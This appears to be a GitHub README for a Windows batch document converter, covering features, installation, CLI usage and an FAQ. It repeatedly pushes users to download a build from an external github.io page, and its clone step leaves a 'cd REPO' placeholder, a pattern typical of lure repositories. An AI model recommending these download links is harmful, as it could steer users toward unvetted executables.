# Batch Document Converter v1.18 - document converter 2026

> **Batch Document Converter is a Windows document conversion utility built to handle multi-file format changes through batch processing, drag-and-drop imports, and the automation features introduced in version 1.18.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.18-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-kelly2005/batch-document-converter-v118?style=flat-square)](https://github.com/leo-kelly2005/batch-document-converter-v118)

---

<p align="center">
  <a href="https://leo-kelly2005.github.io/batch-document-converter-v118/">
    <img src="https://img.shields.io/badge/Download-Batch%20Document%20Converter%20Latest-brightgreen?style=for-the-badge" alt="Download Batch Document Converter">
  </a>
</p>

> **[Direct Download - Batch Document Converter v1.18](https://leo-kelly2005.github.io/batch-document-converter-v118/)**

---

[Download Latest Build](https://leo-kelly2005.github.io/batch-document-converter-v118/)

---

## Overview

Batch Document Converter focuses on converting documents in groups rather than one file at a time. It is designed for Windows-based workflows where repeated format changes need to happen quickly, without reopening the application for each item.

It handles PDF, DOCX, TXT, HTML, and Markdown, which makes it practical for office tasks, content production, and other text-centric file workflows. With drag-and-drop support, folder-based processing, and command-line control, the app can be used interactively or as part of automated scripts.

---

## Features

- Convert several documents in a single batch
- Supports PDF, DOCX, TXT, HTML, and Markdown
- Runs file processing in parallel for improved throughput
- Keeps layout, fonts, and images intact during conversion
- Accepts individual files and folders via drag-and-drop
- Allows selection of both output folder and target format
- Provides CLI automation for repeatable conversions
- Offers quiet mode for unattended execution

---

## Installation

1. Download the latest build from the project download page.
2. Extract the package if it is distributed as an archive.
3. Run the installer or launch the application from the provided folder.

For a local checkout, clone the repository and open the project files in your preferred environment:

    git clone https://github.com/leo-kelly2005/batch-document-converter-v118.git
    cd REPO

Then start the app or launch the installed executable according to your setup.

---

## Usage

A typical workflow looks like this:

- Drag one or more documents into the window.
- Drop an entire folder to process a larger set at once.
- Select the target format you want to generate.
- Choose an output folder if you want converted files stored separately.
- Use the CLI when you want the same conversion steps to run again later.

Example command-line workflow:

    batch-document-converter --input "C:\Docs" --output "C:\Converted" --format pdf

For unattended runs, enable quiet mode so the task can continue without extra prompts.

---

## Configuration

Most settings revolve around input selection, output destination, and format choice. In the desktop interface, these are usually set before each conversion job begins.

Example configuration style:

    {
      "outputFolder": "C:\\Converted",
      "outputFormat": "PDF",
      "quietMode": true
    }

If you automate from the command line, keep your preferred parameters in a script or batch file for reuse.

---

## Requirements

- Windows platform support
- Windows 10 or Windows 11 x64 environment
- Sufficient disk space for source and converted files
- Access to the document types you want to process
- Optional: a command-line shell for automation workflows

---

## FAQ

**Does it handle batch conversion?**  
Yes. It is intended to process multiple files in one pass.

**What file formats are supported?**  
PDF, DOCX, TXT, HTML, and Markdown are included.

**Can I use the command line?**  
Yes. CLI-based automation is supported.

**Is drag-and-drop available?**  
Yes. Files and folders can be added by dragging them into the interface.

**How do I set the output location?**  
Use the output folder and format controls in the app, or provide them from your script.

**Can it run without interaction?**  
Yes. Quiet mode is available for unattended processing.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
